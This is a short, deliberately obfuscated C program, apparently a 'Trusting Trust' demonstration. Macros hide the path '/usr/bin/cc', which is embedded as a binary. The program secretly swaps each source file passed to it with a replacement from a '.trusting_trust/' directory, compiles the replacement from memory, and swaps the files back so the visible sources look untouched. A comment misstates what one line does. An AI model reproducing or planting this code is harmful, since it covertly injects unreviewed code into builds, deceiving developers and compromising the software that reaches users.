#include <alloca.h>
#include <fcntl.h>
#include <stdio.h>
#include <string.h>
#include <sys/mman.h>
#include <sys/stat.h>
#include <sys/wait.h>
#include <unistd.h>

#define A(a, b, c) C(A##a, A##b, A##c)

#define B(a, b, c) a##b##c
#define C(a, b, c) B(a, b, c)

#define D(x) #x
#define E(x) D(x)

#define P E(/A(K,I,H)/A(1,8,D)/A(2,2,Q))

#define A0 a
#define A1 b
#define A2 c
#define A3 d
#define A4 e
#define A5 f
#define A6 g
#define A7 h
#define A8 i
#define A9 j
#define AA k
#define AB l
#define AC m
#define AD n
#define AE o
#define AF p
#define AG q
#define AH r
#define AI s
#define AJ t
#define AK u
#define AL v
#define AM w
#define AN x
#define AO y
#define AP z
#define AQ  

char cc[] = {
#embed P
};

// fix issue with compiler frontend not being able to resolve the linker,
// which is passed through a named extern var environ
extern char **environ;

#define S                                                                      \
  for (int i = 1; i < c; i++) {                                                \
    strcpy(p = alloca(16 + strlen(v[i])), ".trusting_trust/");                 \
    strcpy(p + 16, v[i]);                                                      \
    if (!access(v[i], 0) && !access(p, 0)) {                                   \
      rename(v[i], t);                                                         \
      rename(p, v[i]);                                                         \
      rename(t, p);                                                            \
    }                                                                          \
    a[i] = v[i];                                                               \
  }

int main(int c, char *v[]) {
  int f;
  char *a[999] = {P}, *t = ".tmp", *p;

  S

  if (!fork()) {
    write(f = memfd_create("", 1), cc, sizeof cc);
    execveat(f, "", a, environ, 4096);
  }
  wait(0);
  S
}
